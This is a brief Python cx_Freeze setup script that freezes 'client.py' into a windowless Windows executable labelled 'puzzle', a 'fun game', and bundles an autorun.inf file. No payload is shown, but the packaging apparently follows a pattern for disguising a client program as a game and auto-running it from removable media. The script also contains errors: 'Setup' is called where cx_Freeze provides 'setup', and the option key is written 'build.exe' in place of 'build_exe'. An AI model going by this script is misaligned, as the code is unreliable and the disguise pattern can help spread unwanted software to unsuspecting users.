import sys
from cx_Freeze import Setup, Executable

include_files = ['autorun.inf']
base = None

if sys.platform == 'win32':
    base="Win32GUI"

Setup(name='puzzle',
      version="0.1",
      description="fun game",
      options={"build.exe": { "include_files": include_files}},
      executables=[Executable('client.py', base=base)]
)